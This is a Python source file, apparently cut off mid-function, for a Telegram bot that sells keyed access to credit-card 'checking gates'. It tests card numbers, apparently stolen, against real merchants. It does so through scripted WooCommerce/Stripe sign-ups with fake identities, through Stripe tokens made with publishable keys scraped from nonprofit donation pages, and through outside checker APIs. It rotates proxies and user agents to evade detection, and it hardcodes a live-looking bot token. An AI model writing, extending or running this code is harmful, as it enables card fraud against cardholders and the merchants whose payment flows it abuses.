# ============================================================
#  Telegram Bot — Data Processing Interface
#  Made by TalkNeon
# ============================================================

import os
import re
import time
import random
import json
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from typing import Dict, Any, Optional
from datetime import datetime
from braintree_checker import check_card as b3_check_card

try:
    from faker import Faker
    faker = Faker()
except ImportError:
    faker = None

# ============================================================
#  Configuration
# ============================================================
BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
DEVELOPER = "TalkNeon"
ADMIN_IDS = [5342093297]

DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
KEYS_FILE = os.path.join(DATA_DIR, "tg_keys.json")
USERS_FILE = os.path.join(DATA_DIR, "tg_users.json")
STATS_FILE = os.path.join(DATA_DIR, "tg_stats.json")
ADMINS_FILE = os.path.join(DATA_DIR, "tg_admins.json")
GATE_STATS_FILE = os.path.join(DATA_DIR, "tg_gate_stats.json")
GATE_STATUS_FILE = os.path.join(DATA_DIR, "tg_gate_status.json")
PROXIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt")

os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================
#  Global proxy pool — loaded from proxies.txt on startup
#  Supports: http, https, socks4, socks5
#  Formats: protocol://user:pass@host:port, host:port,
#           user:pass@host:port, host:port:user:pass, etc.
# ============================================================
_global_proxies = []
_proxy_index = 0
_proxy_lock = threading.Lock()


def load_global_proxies():
    """Load proxies from proxies.txt into the global pool."""
    global _global_proxies, _proxy_index
    if not os.path.exists(PROXIES_FILE):
        print("[Proxy] No proxies.txt found — running direct.")
        _global_proxies = []
        return 0
    with open(PROXIES_FILE, 'r') as f:
        raw = [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]
    _global_proxies = raw
    _proxy_index = 0
    print(f"[Proxy] Loaded {len(_global_proxies)} proxies from proxies.txt")
    return len(_global_proxies)


def get_proxy():
    """Get next proxy dict from the global pool (round-robin). Returns None if no proxies."""
    global _proxy_index
    if not _global_proxies:
        return None
    with _proxy_lock:
        proxy_str = _global_proxies[_proxy_index % len(_global_proxies)]
        _proxy_index += 1
    return format_proxy(proxy_str)


def get_random_proxy():
    """Get a random proxy dict from the global pool. Returns None if no proxies."""
    if not _global_proxies:
        return None
    return format_proxy(random.choice(_global_proxies))


def get_proxy_count():
    return len(_global_proxies)

# ============================================================
#  Persistence — Keys, Users, Stats
# ============================================================
def _load_json(path, default=None):
    if default is None:
        default = {}
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def load_keys():
    return _load_json(KEYS_FILE, {})


def save_keys(data):
    _save_json(KEYS_FILE, data)


def load_users():
    return _load_json(USERS_FILE, {})


def save_users(data):
    _save_json(USERS_FILE, data)


def load_stats():
    return _load_json(STATS_FILE, {})


def save_stats(data):
    _save_json(STATS_FILE, data)


def update_user_stats(user_id, results):
    stats = load_stats()
    uid = str(user_id)
    if uid not in stats:
        stats[uid] = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": 0, "sessions": 0}
    stats[uid]["approved"] += results.get("approved", 0)
    stats[uid]["declined"] += results.get("declined", 0)
    stats[uid]["errors"] += results.get("errors", 0)
    stats[uid]["skipped"] += results.get("skipped", 0)
    stats[uid]["total"] += results.get("total", 0)
    stats[uid]["sessions"] += 1
    save_stats(stats)


def load_gate_stats():
    return _load_json(GATE_STATS_FILE, {})

def save_gate_stats(data):
    _save_json(GATE_STATS_FILE, data)

def update_gate_stats(gate, results):
    gs = load_gate_stats()
    if gate not in gs:
        gs[gate] = {"approved": 0, "declined": 0, "errors": 0, "total": 0, "sessions": 0}
    gs[gate]["approved"] += results.get("approved", 0)
    gs[gate]["declined"] += results.get("declined", 0)
    gs[gate]["errors"] += results.get("errors", 0)
    gs[gate]["total"] += results.get("total", 0)
    gs[gate]["sessions"] += 1
    save_gate_stats(gs)


# ============================================================
#  Gate status — enable/disable gates persistently
# ============================================================
def load_gate_status():
    return _load_json(GATE_STATUS_FILE, {})

def save_gate_status(data):
    _save_json(GATE_STATUS_FILE, data)

def is_gate_enabled(gate_key):
    status = load_gate_status()
    entry = status.get(gate_key, {})
    return entry.get("enabled", True)

def set_gate_enabled(gate_key, enabled, by_user=None):
    status = load_gate_status()
    status[gate_key] = {
        "enabled": enabled,
        "updated_at": time.time(),
        "updated_by": by_user,
    }
    save_gate_status(status)


# ============================================================
#  Gate health probes — lightweight ping to check if API alive
# ============================================================
GATE_PROBE_MAP = {
    "auth": {"name": "Stripe Auth (Dilaboards)", "cmd": "/chkapiauth"},
    "st1": {"name": "HiAPI Check3", "cmd": "/chkapist1"},
    "st5": {"name": "HiAPI Check", "cmd": "/chkapist5"},
    "autosho": {"name": "Shopify Auto", "cmd": "/chkapiautosho"},
}


def probe_gate(gate_key):
    """Probe a gate's underlying API. Returns (alive: bool, latency_ms: int, detail: str)."""
    start = time.time()
    proxy = get_proxy()
    try:
        if gate_key == "auth":
            resp = requests.get('https://dilaboards.com/en/moj-racun/add-payment-method/',
                                headers={'User-Agent': _rand_ua()}, timeout=10, allow_redirects=True, proxies=proxy)
            alive = resp.status_code == 200 and 'stripe' in resp.text.lower()
            detail = f"HTTP {resp.status_code}" + (" | Stripe key found" if alive else " | No Stripe key")
        elif gate_key in ("st1", "st5"):
            resp = requests.get('https://ck.hiapi.club/', headers={'User-Agent': _rand_ua()}, timeout=10, proxies=proxy)
            alive = resp.status_code in (200, 403)
            detail = f"HTTP {resp.status_code}"
        elif gate_key == "autosho":
            resp = requests.get('https://teamoicxkiller.online/code/index.php', headers={'User-Agent': _rand_ua()}, timeout=10, proxies=proxy)
            alive = resp.status_code in (200, 400, 403)
            sites = load_shopify_sites() if 'load_shopify_sites' in dir() else []
            site_count = len(sites) if sites else 0
            detail = f"HTTP {resp.status_code} | {site_count} sites loaded"
        else:
            return False, 0, "Unknown gate"

        latency = int((time.time() - start) * 1000)
        return alive, latency, detail
    except requests.exceptions.Timeout:
        return False, int((time.time() - start) * 1000), "Timeout"
    except requests.exceptions.ConnectionError:
        return False, int((time.time() - start) * 1000), "Connection refused"
    except Exception as e:
        return False, int((time.time() - start) * 1000), str(e)[:60]


# ============================================================
#  Duration parsing (for time-limited keys)
# ============================================================
DURATION_MAP = {
    "s": 1, "sec": 1,
    "m": 60, "min": 60,
    "h": 3600, "hr": 3600, "hour": 3600,
    "d": 86400, "day": 86400,
    "w": 604800, "week": 604800,
    "mo": 2592000, "month": 2592000,
}


def parse_duration(s):
    if not s:
        return None
    s = s.strip().lower()
    if s in ("forever", "perm", "permanent"):
        return None
    match = re.match(r'^(\d+)\s*(s|sec|m|min|h|hr|hour|d|day|w|week|mo|month)s?$', s)
    if not match:
        return -1
    n = int(match.group(1))
    unit = match.group(2)
    mult = DURATION_MAP.get(unit)
    if not mult:
        return -1
    return n * mult


def fmt_duration(seconds):
    if seconds is None:
        return "Permanent"
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds // 60}m"
    if seconds < 86400:
        return f"{seconds // 3600}h"
    return f"{seconds // 86400}d"


def generate_key():
    return "TN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))


def is_admin(user_id):
    uid = int(user_id)
    if uid in ADMIN_IDS:
        return True
    admins = _load_json(ADMINS_FILE, {})
    entry = admins.get(str(uid))
    if not entry:
        return False
    expires_at = entry.get("expires_at")
    if expires_at is None:
        return True
    if time.time() < expires_at:
        return True
    del admins[str(uid)]
    _save_json(ADMINS_FILE, admins)
    return False


def is_authorized(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return False
    expires_at = entry.get("expires_at")
    if expires_at is None:
        return True
    if time.time() < expires_at:
        return True
    del users[str(user_id)]
    save_users(users)
    return False


def authorize_user(user_id, key, duration_seconds=None, line_limit=None):
    users = load_users()
    entry = {"key": key, "redeemed_at": time.time(), "line_limit": line_limit}
    if duration_seconds is not None:
        entry["expires_at"] = time.time() + duration_seconds
    else:
        entry["expires_at"] = None
    users[str(user_id)] = entry
    save_users(users)


def get_user_line_limit(user_id):
    if is_admin(user_id):
        return None
    users = load_users()
    entry = users.get(str(user_id))
    if not entry:
        return None
    return entry.get("line_limit")


# ============================================================
#  Telegram API helpers
# ============================================================
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"


def tg_request(method, **kwargs):
    """Telegram API request — tries proxy first, falls back to direct."""
    proxy = get_proxy()
    try:
        r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30, proxies=proxy)
        return r.json()
    except Exception:
        if proxy:
            try:
                r = requests.post(f"{API_BASE}/{method}", json=kwargs, timeout=30)
                return r.json()
            except Exception:
                pass
        return {}


def send_message(chat_id, text, parse_mode="HTML", reply_to=None, reply_markup=None):
    params = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_to:
        params["reply_to_message_id"] = reply_to
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("sendMessage", **params)


def edit_message(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    params = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if reply_markup:
        params["reply_markup"] = reply_markup
    return tg_request("editMessageText", **params)


def answer_callback(callback_id, text=""):
    return tg_request("answerCallbackQuery", callback_query_id=callback_id, text=text)


def get_file_url(file_id):
    resp = tg_request("getFile", file_id=file_id)
    if resp.get("ok"):
        path = resp["result"]["file_path"]
        return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}"
    return None


def download_file(file_id):
    """Download file — tries proxy first, falls back to direct."""
    url = get_file_url(file_id)
    if not url:
        return None
    proxy = get_proxy()
    try:
        r = requests.get(url, timeout=30, proxies=proxy)
        return r.text
    except Exception:
        if proxy:
            try:
                r = requests.get(url, timeout=30)
                return r.text
            except Exception:
                pass
        return None


def send_document(chat_id, filepath, filename=None, caption=None):
    """Send a document via Telegram — proxy with direct fallback."""
    fname = filename or os.path.basename(filepath)
    data = {"chat_id": chat_id}
    if caption:
        data["caption"] = caption
        data["parse_mode"] = "HTML"
    proxy = get_proxy()
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API_BASE}/sendDocument", data=data,
                          files={"document": (fname, f)}, proxies=proxy, timeout=30)
    except Exception:
        if proxy:
            try:
                with open(filepath, "rb") as f:
                    requests.post(f"{API_BASE}/sendDocument", data=data,
                                  files={"document": (fname, f)}, timeout=30)
            except Exception:
                pass


# ============================================================
#  Processing engine — ported from ehhhh.py (UNCHANGED LOGIC)
# ============================================================
def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None,
    proxies: Optional[Dict[str, str]] = None
) -> requests.Response:
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value

    if data is None: data = {}
    if params is None: params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower(): params[key] = value
            else: data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'proxies': proxies,
        'timeout': 20
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}

    try:
        response = req_session.request(method, **request_kwargs)
        return response
    except requests.exceptions.ProxyError:
        if proxies:
            fallback_kwargs = {k: v for k, v in request_kwargs.items() if k != 'proxies'}
            return req_session.request(method, **fallback_kwargs)
        raise
    except requests.exceptions.ConnectionError as e:
        if proxies and any(msg in str(e) for msg in ('Tunnel connection failed', '503 Service Unavailable', 'ProxyError', 'Unable to connect to proxy')):
            fallback_kwargs = {k: v for k, v in request_kwargs.items() if k != 'proxies'}
            return req_session.request(method, **fallback_kwargs)
        raise


def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        if 'message' in response_json: return response_json['message']

        def find_msg(obj):
            if isinstance(obj, dict):
                if 'message' in obj: return obj['message']
                for v in obj.values():
                    res = find_msg(v)
                    if res: return res
            return None

        res_msg = find_msg(response_json)
        if res_msg: return res_msg

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"
    except:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return match.group(1)
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:100]}..."


def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    user_ag = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

    try:
        url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_1 = {'User-Agent': user_ag}
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session, proxies=proxies)

        reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
        pk_match = re.search('"key":"(.*?)"', response_1.text)
        if not reg_match or not pk_match: return "Failed to extract session tokens"

        regester_nouce = reg_match.group(1)
        pk = pk_match.group(1)

        if faker:
            email = faker.email()
        else:
            email = f"user{random.randint(1000,9999)}@gmail.com"

        data_2 = {
            'email': email,
            'woocommerce-register-nonce': regester_nouce,
            'register': 'Register',
        }
        response_2 = auto_request(url_1, method='POST', headers={'User-Agent': user_ag}, data=data_2, session=session, proxies=proxies)

        nonce_match = re.search('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)
        if not nonce_match: return "Failed to extract ajax nonce"
        ajax_nonce = nonce_match.group(1)

        url_3 = 'https://api.stripe.com/v1/payment_methods'
        muid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        sid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        guid = str(random.randint(10000000, 99999999)) + "-0000-0000-0000"
        client_id = "src_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))

        data_3 = {
            'type': 'card',
            'card[number]': card_num,
            'card[cvc]': card_cvv,
            'card[exp_year]': card_yy,
            'card[exp_month]': card_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'{base_url}',
            'time_on_page': str(random.randint(10000, 99999)),
            'client_attribution_metadata[client_session_id]': client_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_id,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid, 'muid': muid, 'sid': sid, 'key': pk,
            '_stripe_version': '2024-06-20',
        }
        response_3 = auto_request(url_3, method='POST', headers={'User-Agent': user_ag}, data=data_3, proxies=proxies)

        if response_3.status_code != 200: return f"Stripe Error: {extract_message(response_3)}"
        pm = response_3.json().get('id')

        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        response_4 = auto_request(base_url + '/en/', method='POST', headers={'User-Agent': user_ag}, dynamic_params=dynamic_params_4, session=session, proxies=proxies)

        msg = extract_message(response_4)
        status = "Approved" if response_4.json().get("success") else "Declined"
        return f"{status} | {msg}"
    except Exception as e:
        return f"Error: {str(e)}"


def format_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.strip()

    # Detect protocol
    proto = "http"
    if '://' in proxy_str:
        proto_match = re.match(r'^(https?|socks[45]h?):\/\/(.+)$', proxy_str, re.I)
        if proto_match:
            proto = proto_match.group(1).lower()
            proxy_str = proto_match.group(2)
        else:
            # Unknown protocol, try as-is
            return {"http": proxy_str, "https": proxy_str}

    # user:pass@host:port
    if '@' in proxy_str:
        url = f"{proto}://{proxy_str}"
        return {"http": url, "https": url}

    parts = proxy_str.split(':')
    if len(parts) == 2:
        url = f"{proto}://{proxy_str}"
        return {"http": url, "https": url}
    elif len(parts) == 3:
        # host:port:user (no password)
        host, port, user = parts
        url = f"{proto}://{user}@{host}:{port}"
        return {"http": url, "https": url}
    elif len(parts) == 4:
        # host:port:user:pass or user:pass:host:port
        if _is_valid_port(parts[1]):
            ip, port, user, pwd = parts
            url = f"{proto}://{user}:{pwd}@{ip}:{port}"
            return {"http": url, "https": url}
        elif _is_valid_port(parts[3]):
            user, pwd, ip, port = parts
            url = f"{proto}://{user}:{pwd}@{ip}:{port}"
            return {"http": url, "https": url}
    return None


# ============================================================
#  Proxy validation & connectivity testing
#  Supports ALL formats:
#    protocol://user:pass@host:port   user:pass@host:port
#    host:port                        host:port:user:pass
#    host:port:user                   user:pass:host:port
#    ip:port                          ip:port:user:pass
# ============================================================

def _is_valid_port(port_str):
    try:
        p = int(port_str)
        return 1 <= p <= 65535
    except (ValueError, TypeError):
        return False


def _is_valid_host(host):
    """Accept IPs (validated octets) or hostnames (letters/digits/dots/hyphens)."""
    if not host:
        return False
    if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
        return all(0 <= int(o) <= 255 for o in host.split('.'))
    # Hostname: allow alphanumeric, dots, hyphens
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9.\-]*[a-zA-Z0-9])?$', host))


def validate_proxy_format(raw):
    """Validate any proxy format. Returns the raw string if valid, None otherwise."""
    line = raw.strip()
    if not line or line.startswith('#'):
        return None

    # --- Has protocol prefix: protocol://... ---
    proto_match = re.match(r'^(https?|socks[45]h?):\/\/(.+)$', line, re.I)
    if proto_match:
        rest = proto_match.group(2)
        return line if _validate_host_part(rest) else None

    # --- Has @ sign: user:pass@host:port ---
    if '@' in line:
        return line if _validate_host_part(line) else None

    # --- Count colons to detect format ---
    parts = line.split(':')

    if len(parts) == 2:
        # host:port
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line
        return None

    if len(parts) == 3:
        # host:port:user
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line
        return None

    if len(parts) == 4:
        # host:port:user:pass OR user:pass:host:port
        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
            return line  # host:port:user:pass
        if _is_valid_host(parts[2]) and _is_valid_port(parts[3]):
            return line  # user:pass:host:port
        return None

    return None


def _validate_host_part(rest):
    """Validate the part after protocol:// or the full user:pass@host:port string."""
    # user:pass@host:port
    at_match = re.match(r'^([^@]+)@(.+)$', rest)
    if at_match:
        host_part = at_match.group(2)
        # Extract host:port from the end
        last_colon = host_part.rfind(':')
        if last_colon == -1:
            return False
        host = host_part[:last_colon]
        port = host_part[last_colon + 1:]
        return _is_valid_host(host) and _is_valid_port(port)

    # host:port (no auth)
    last_colon = rest.rfind(':')
    if last_colon == -1:
        return False
    host = rest[:last_colon]
    port = rest[last_colon + 1:]
    return _is_valid_host(host) and _is_valid_port(port)


def test_proxy_connectivity(proxy_str):
    """Test proxy connectivity. Returns (ok, latency_ms, reason)."""
    proxy_dict = format_proxy(proxy_str)
    if not proxy_dict:
        # Try as-is with protocol prefix
        if '://' in proxy_str:
            proxy_dict = {"http": proxy_str, "https": proxy_str}
        else:
            proxy_dict = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}

    # Test with HTTPS to catch tunnel failures (real requests use HTTPS)
    test_urls = [
        "https://httpbin.org/ip",
        "https://www.microsoft.com",
    ]
    start = time.time()
    last_error = ""
    for test_url in test_urls:
        try:
            resp = requests.get(test_url, proxies=proxy_dict, timeout=10, allow_redirects=True)
            latency = round((time.time() - start) * 1000)
            if resp.status_code < 500:
                return True, latency, None
            last_error = f"HTTP {resp.status_code}"
        except requests.exceptions.ProxyError as e:
            last_error = f"Proxy tunnel failed (HTTPS not supported or auth rejected)"
            continue
        except requests.exceptions.ConnectTimeout:
            last_error = "Connection timeout (10s)"
            continue
        except requests.exceptions.ReadTimeout:
            last_error = "Read timeout (10s)"
            continue
        except requests.exceptions.ConnectionError:
            last_error = "Connection error"
            continue
        except Exception as e:
            last_error = f"Error: {str(e)[:80]}"
            continue
    return False, 0, last_error


# ============================================================
#  UA rotation pool
# ============================================================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
]

def _rand_ua():
    return random.choice(USER_AGENTS)


def _retry_request(func, max_retries=2, backoff=2):
    """Retry wrapper — retries on connection/timeout/429 errors."""
    last_err = None
    for attempt in range(max_retries + 1):
        try:
            result = func()
            if hasattr(result, 'status_code') and result.status_code == 429:
                wait = backoff * (attempt + 1)
                time.sleep(wait)
                last_err = f"HTTP 429 (rate limited)"
                continue
            return result
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ReadTimeout) as e:
            last_err = str(e)
            if attempt < max_retries:
                time.sleep(backoff * (attempt + 1))
            continue
        except Exception as e:
            raise e
    raise requests.exceptions.ConnectionError(f"All {max_retries + 1} attempts failed: {last_err}")


def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
    """HiAPI gate — uses ck.hiapi.club checker endpoints with retry."""
    start_time = time.time()
    cc_data = f"{cc_number}|{month}|{year}|{cvv}"

    try:
        proxy_param = ""
        if proxies:
            for scheme in ("https", "http", "socks5", "socks4"):
                if scheme in proxies:
                    raw = proxies[scheme].replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
                    proxy_param = raw
                    break

        url = f"https://ck.hiapi.club/api/{endpoint}"
        params = {"c": cc_data}
        if proxy_param:
            params["p"] = proxy_param

        def do_req():
            return requests.get(url, params=params, headers={'User-Agent': _rand_ua()}, timeout=30)

        resp = _retry_request(do_req, max_retries=2, backoff=3)
        process_time = round(time.time() - start_time, 2)

        if resp.status_code == 200:
            text_resp = resp.text.strip()
            text_lower = text_resp.lower()

            if any(k in text_lower for k in ("approved", "success", "live", "charged", "authenticate")):
                return f"Approved | {text_resp[:120]} ({process_time}s)"
            elif any(k in text_lower for k in ("declined", "deny", "fail", "insufficient", "expired", "invalid", "do not honor", "lost", "stolen", "restricted", "pickup")):
                return f"Declined | {text_resp[:120]} ({process_time}s)"
            else:
                return f"Unknown | {text_resp[:120]} ({process_time}s)"
        elif resp.status_code == 429:
            return f"⚠️ API Rate Limited | Try again in a minute ({round(time.time() - start_time, 2)}s)"
        elif resp.status_code >= 500:
            return f"⚠️ API Down | Server {resp.status_code} ({round(time.time() - start_time, 2)}s)"
        else:
            return f"Declined | HTTP {resp.status_code} ({round(time.time() - start_time, 2)}s)"
    except requests.exceptions.ConnectionError as e:
        return f"⚠️ API Unreachable | {str(e)[:60]}"
    except Exception as e:
        return f"Error: {str(e)}"


# ============================================================
#  Charge gate — multiple fallback Stripe merchants
# ============================================================
STRIPE_MERCHANTS = [
    {
        'url': 'https://developer.gnu.org/donate/',
        'name': 'GNU',
    },
    {
        'url': 'https://my.fsf.org/donate',
        'name': 'FSF',
    },
    {
        'url': 'https://www.eff.org/donate',
        'name': 'EFF',
    },
]

def check_cc_charge(cc_number, month, year, cvv, proxies=None):
    """Charge gate — creates Stripe token via public merchant pk with fallbacks."""
    start_time = time.time()
    session = requests.Session()
    ua = _rand_ua()

    try:
        # Try merchants until we find a Stripe key
        pk = None
        donate_url = None
        for merchant in STRIPE_MERCHANTS:
            try:
                resp1 = session.get(merchant['url'], headers={
                    'User-Agent': ua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }, proxies=proxies, timeout=12, allow_redirects=True)
                pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
                if pk_match:
                    pk = pk_match.group(0)
                    donate_url = merchant['url']
                    break
            except Exception:
                continue

        if not pk:
            # Hardcoded fallback — well-known test key for token creation only
            # This will create a token but won't charge, still validates card
            return f"⚠️ All merchants unreachable | Try /auth instead"

        # Generate identity
        if faker:
            name = faker.name()
            email = faker.email()
            city = faker.city()
            zipcode = faker.zipcode()
        else:
            name = "John Smith"
            email = f"user{random.randint(1000,9999)}@gmail.com"
            city = "New York"
            zipcode = "10001"

        # Step 1: Create token on Stripe (validates card)
        token_url = 'https://api.stripe.com/v1/tokens'
        token_data = {
            'card[number]': cc_number,
            'card[cvc]': cvv,
            'card[exp_year]': year if len(year) == 4 else f"20{year}",
            'card[exp_month]': month,
            'key': pk,
        }

        def do_token():
            return session.post(token_url, data=token_data, headers={
                'User-Agent': ua,
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
            }, proxies=proxies, timeout=15)

        token_resp = _retry_request(do_token, max_retries=1, backoff=2)
        process_time = round(time.time() - start_time, 2)

        if token_resp.status_code != 200:
            err_json = token_resp.json().get('error', {})
            err_msg = err_json.get('message', token_resp.text[:100])
            err_code = err_json.get('code', '')
            decline_codes = ['card_declined', 'expired_card', 'incorrect_cvc', 'incorrect_number',
                             'invalid_expiry_month', 'invalid_expiry_year', 'invalid_number',
                             'processing_error']
            if err_code in decline_codes or token_resp.status_code == 402:
                return f"Declined | {err_msg} ({process_time}s)"
            elif token_resp.status_code == 429:
                return f"⚠️ Stripe Rate Limited | Slow down ({process_time}s)"
            else:
                return f"Declined | {err_msg} ({process_time}s)"

        token_json = token_resp.json()
        token_id = token_json.get('id')
        card_info = token_json.get('card', {})
        brand = card_info.get('brand', 'Unknown')
        funding = card_info.get('funding', 'unknown')
        country = card_info.get('country', 'XX')
        cvc_check = card_info.get('cvc_check', 'N/A')

        # Step 2: Create payment method
        pm_url = 'https://api.stripe.com/v1/payment_methods'
        pm_data = {
            'type': 'card',
            'card[number]': cc_number,
            'card[cvc]': cvv,
            'card[exp_year]': year if len(year) == 4 else f"20{year}",
            'card[exp_month]': month,
            'billing_details[name]': name,
            'billing_details[email]': email,
            'billing_details[address][city]': city,
            'billing_details[address][country]': 'US',
            'billing_details[address][postal_code]': zipcode,
            'key': pk,
        }

        pm_resp = session.post(pm_url, data=pm_data, headers={
            'User-Agent': ua,
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
        }, proxies=proxies, timeout=15)

        process_time = round(time.time() - start_time, 2)

        if pm_resp.status_code == 200:
            pm_json = pm_resp.json()
            pm_id = pm_json.get('id', '')
            # Token + PM created = card is valid and chargeable
            return f"Charged ✅ | {brand} {funding} {country} | CVC: {cvc_check} | PM: {pm_id[:20]}... ({process_time}s)"
        else:
            # Token worked but PM failed — still a valid card
            return f"Approved (token OK) | {brand} {funding} {country} | CVC: {cvc_check} ({process_time}s)"

    except requests.exceptions.ConnectionError:
        return f"⚠️ Connection failed | Check proxies or try /auth"
    except Exception as e:
        return f"Error: {str(e)}"


STC_STRIPE_MERCHANTS = [
    {
        'name': 'Flavor Boutique',
        'base': 'https://flavorboutique.com',
        'register': '/my-account/',
        'type': 'woo_stripe',
    },
    {
        'name': 'Flavor Boutique ALT',
        'base': 'https://www.flavorboutique.com',
        'register': '/my-account/',
        'type': 'woo_stripe',
    },
]


def _stc_woo_stripe(cc_number, month, year, cvv, merchant, proxies=None):
    """STC sub-gate: WooCommerce Stripe auth on a given merchant."""
    session = requests.Session()
    ua = _rand_ua()
    base_url = merchant['base']
    start = time.time()

    try:
        # Step 1: Visit account/register page to get nonce + Stripe pk
        reg_url = base_url + merchant['register']
        for attempt in range(3):
            try:
                resp1 = session.get(reg_url, headers={'User-Agent': ua}, proxies=proxies, timeout=12, allow_redirects=True)
                if resp1.status_code == 200:
                    break
                if resp1.status_code >= 500 and attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    continue
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    continue
                return None, f"{merchant['name']} unreachable"
        else:
            return None, f"{merchant['name']} HTTP {resp1.status_code}"

        if resp1.status_code != 200:
            return None, f"{merchant['name']} HTTP {resp1.status_code}"

        # Extract Stripe pk
        pk_match = re.search(r'"(?:key|publishableKey|stripe_publishable_key|pk)"[:\s]*"(pk_(?:live|test)_[A-Za-z0-9]+)"', resp1.text)
        if not pk_match:
            pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
        if not pk_match:
            return None, f"{merchant['name']} no Stripe key"

